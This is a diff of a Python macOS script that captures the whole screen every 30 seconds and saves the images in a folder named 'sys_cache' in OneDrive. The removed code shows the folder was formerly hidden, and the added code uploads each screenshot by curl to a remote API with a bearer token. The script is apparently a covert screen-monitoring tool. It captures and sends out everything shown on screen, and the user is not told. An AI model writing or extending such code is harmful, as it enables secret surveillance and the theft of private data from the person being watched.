@@ -2,35 +2,33 @@ import os
 import time
 import datetime
 import sys
+import logging
+import subprocess
 import pyautogui
 
-# Caminho padrão do OneDrive no macOS
 BASE_DIR = os.path.expanduser("~/OneDrive/sys_cache")
 IMG_DIR = os.path.join(BASE_DIR, "img")
 COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
+STATUS_FILE = os.path.join(BASE_DIR, "status.txt")
+LOG_FILE = os.path.join(BASE_DIR, "syscache.log")
 
 INTERVAL = 30  # segundos
 RETENTION_DAYS = 3
+UPLOAD_API_URL = os.getenv("UPLOAD_API_URL", "").strip()
+UPLOAD_API_TOKEN = os.getenv("UPLOAD_API_TOKEN", "").strip()
 
 
 def create_dirs():
-    global BASE_DIR, IMG_DIR, COUNTER_FILE
-    for path in [BASE_DIR, IMG_DIR]:
-        if not os.path.exists(path):
-            os.makedirs(path)
+    os.makedirs(BASE_DIR, exist_ok=True)
+    os.makedirs(IMG_DIR, exist_ok=True)
 
-            # Oculta pasta no macOS (prefixo .)
-            hidden_path = os.path.join(os.path.dirname(path), "." + os.path.basename(path))
-            if not os.path.exists(hidden_path):
-                os.rename(path, hidden_path)
 
-                # Atualiza path após renomear
-                if path == BASE_DIR:
-                    BASE_DIR = hidden_path
-                    IMG_DIR = os.path.join(BASE_DIR, "img")
-                    COUNTER_FILE = os.path.join(BASE_DIR, "counter.txt")
-                else:
-                    IMG_DIR = hidden_path
+def setup_logging():
+    logging.basicConfig(
+        filename=LOG_FILE,
+        level=logging.INFO,
+        format="%(asctime)s - %(levelname)s - %(message)s"
+    )
 
 
 def load_counter():
@@ -58,6 +56,49 @@ def take_screenshot(timestamp):
     filepath = os.path.join(IMG_DIR, f"S_{timestamp}.png")
     ss = pyautogui.screenshot()
     ss.save(filepath)
+    logging.info("Screenshot salva em %s", filepath)
+    send_screenshot_to_api(filepath)
+
+
+def send_screenshot_to_api(filepath):
+    if not UPLOAD_API_URL:
+        return
+
+    cmd = [
+        "curl",
+        "-sS",
+        "-X",
+        "POST",
+        UPLOAD_API_URL,
+        "-F",
+        f"file=@{filepath}",
+    ]
+
+    if UPLOAD_API_TOKEN:
+        cmd.extend(["-H", f"Authorization: Bearer {UPLOAD_API_TOKEN}"])
+
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            check=False,
+        )
+        if result.returncode == 0:
+            logging.info("Upload enviado com sucesso para API.")
+        else:
+            logging.error(
+                "Falha no upload (%s): %s",
+                result.returncode,
+                (result.stderr or result.stdout).strip(),
+            )
+    except Exception as e:
+        logging.exception("Erro ao executar curl para upload: %s", e)
+
+
+def heartbeat():
+    with open(STATUS_FILE, "w", encoding="utf-8") as f:
+        f.write(datetime.datetime.now().isoformat())
 
 
 def cleanup_old_files():
@@ -68,15 +109,16 @@ def cleanup_old_files():
         for file in files:
             path = os.path.join(root, file)
 
-            if path == COUNTER_FILE:
+            if path in (COUNTER_FILE, STATUS_FILE, LOG_FILE):
                 continue
 
             if os.path.isfile(path):
                 if os.path.getmtime(path) < cutoff:
                     try:
                         os.remove(path)
-                    except:
-                        pass
+                        logging.info("Arquivo removido: %s", path)
+                    except Exception as e:
+                        logging.error("Erro ao remover %s: %s", path, e)
 
 
 def main_loop():
@@ -89,6 +131,7 @@ def main_loop():
         save_number(counter, timestamp)
         take_screenshot(timestamp)
         save_counter(counter)
+        heartbeat()
         cleanup_old_files()
 
         time.sleep(INTERVAL)
@@ -97,7 +140,9 @@ def main_loop():
 if __name__ == '__main__':
     try:
         create_dirs()
+        setup_logging()
+        logging.info("Iniciando main_script_mac")
         main_loop()
     except KeyboardInterrupt:
-        print('\nExiting by user request.\n', file=sys.stderr)
+        logging.info("Finalizado por interrupção do usuário.")
         sys.exit(0)
